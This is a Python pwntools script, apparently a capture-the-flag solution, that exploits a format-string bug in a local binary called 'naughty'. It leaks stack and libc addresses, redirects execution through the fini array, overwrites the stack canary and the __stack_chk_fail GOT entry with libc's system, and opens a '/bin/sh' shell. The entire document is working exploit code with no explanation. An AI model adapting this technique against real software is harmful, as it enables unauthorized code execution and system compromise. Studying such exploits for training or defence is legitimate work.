from pwn import *

e = ELF("./naughty")

libc = ELF("./libc.so.6")



p = process("./naughty")


#gdb.attach(p,"""break * main+257""")


main = 0x08048536

fini = 0x08049bac


print("main", hex(main))
print("fini", hex(fini))
print("printf got", hex(e.got["printf"]))

p.recvuntil("?")

exploit = "%{}p%27$hn%{}p%28$hn |%72$p|%75$p|".format(0x0804, 0x8536-0x0804)
exploit = exploit.ljust(80)

exploit += p32(fini+2)
exploit += p32(fini)

p.sendline(exploit)

p.recvline()
dat = p.recvline()

print('dat', dat)


parsed = dat.split("|")

ebp = int(parsed[1], 16) - 0xf8
canary_addr = ebp-0xc

libc.address = int(parsed[2], 16) - 0x18e81

#print("ebp", hex(ebp))
print("canary address", hex(canary_addr))
print("libc address", hex(libc.address))
print("stack chk fail", hex(e.got["__stack_chk_fail"]))


og = libc.sym["system"]
og_hex = hex(og)[2:]

high = int(og_hex[:4], 16)
low = int(og_hex[4:], 16)


print(og_hex)
print(hex(high))
print(hex(low))

#print("high" if high > low else "low")
exploit = "/bin/sh; %{}p%27$n%{}p%28$hn%{}p%29$hn".format(0x60, low-0x69, high-low)

exploit = exploit.ljust(80)

exploit += p32(canary_addr)
exploit += p32(e.got["__stack_chk_fail"])
exploit += p32(e.got["__stack_chk_fail"]+2)

p.recvuntil("?")

p.sendline(exploit)

p.interactive()
